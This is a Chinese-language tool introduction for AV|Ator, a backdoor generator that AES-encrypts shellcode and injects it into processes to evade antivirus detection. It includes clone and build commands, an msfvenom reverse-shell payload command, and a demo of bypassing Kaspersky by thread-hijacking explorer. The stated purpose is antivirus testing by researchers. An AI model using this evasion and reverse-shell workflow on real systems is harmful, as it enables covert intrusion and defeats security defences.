![](https://image.3001.net/images/20230420/1681924871_644023076c59991228738.png!small)  

## 关于AV|Ator

AV|Ator是一款功能强大的AV检测绕过工具，从本质上来说，该工具是一个后门生成实用工具，该工具使用了加密技术和注入技术来尝试绕过反病毒产品的检测。因此，广大研究人员可以使用该工具来测试目标反病毒产品的安全检测能力。

## 技术实现

> 1、该工具使用了AES加密算法来对给定的Shellcode进行加密处理；
>
> 2、该工具可以生成一个包含了加密Payload的可执行文件；
>
> 3、最终的Shellcode可以使用各种不同的注入技术在目标操作系统中执行注入和解密；

## 工具安装

### Windows安装

广大研究人员可以直接点击【[
_这里_](https://github.com/Ch0pin/AVIator/tree/master/Compiled%20Binaries)】下载预编译的项目可执行文件。

除此之外，我们也可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/Ch0pin/AVIator.git

并使用C#开发环境来对项目代码进行本地编译。

### Linux安装

首先，我们需要根据Linux操作系统发行版版本来安装Mono，然后下载并运行项目代码即可。

下面以Kali为例：

    
    
    git clone https://github.com/Ch0pin/AVIator.git
    
    cd AVIator
    
    root@kali# apt install mono-devel
    
    root@kali# mono aviator.exe

## 工具使用

该工具提供了一个表单，其中包含三个主要的输入参数：

![](https://image.3001.net/images/20230420/1681924907_6440232b7896eaddfecd2.png!small)

> 1、加密密钥，用于对Shellcode进行加密；
>
> 2、IV向量，用于AES加密；
>
> 3、Shellcode；

## 工具使用演示

在下面的工具使用演示样例中，我们将尝试在一台Windows 10 x64主机上绕过最新版本的卡巴斯基反病毒产品。

首先，我们使用msfvenom来创建Payload：

    
    
    msfvenom -p windows/x64/shell/reverse_tcp_rc4 LHOST=10.0.2.15 LPORT=443 EXITFUNC=thread RC4PASSWORD=S3cr3TP4ssw0rd -f csharp

接下来，对AV|Ator执行下列操作：

> 目标操作系统架构：x64；
>
> 注入技术：线程劫持（Shellcode Arch：x64，OS Arch：x64）；；
>
> 目标程序：explorer（默认）;

然后在我们的设备上设置好监听器，然后在目标设备上运行生成的可执行文件即可。

## 工具运行截图

![](https://image.3001.net/images/20230420/1681924945_644023514c13dacbe130b.png!small)

## 许可证协议

本项目的开发与发布遵循[ _GPL_
_-3.0_](https://github.com/Ch0pin/AVIator/blob/master/LICENSE)开源许可证协议。

## 项目地址

 **AV|Ator** ：【[ _GitHub传送门_](https://github.com/Ch0pin/AVIator)】

## 参考资料

> [ _https://en.wikipedia.org/wiki/Ator_](https://en.wikipedia.org/wiki/Ator)
>
> [
> _https://attack.mitre.org/techniques/T1055/_](https://attack.mitre.org/techniques/T1055/)

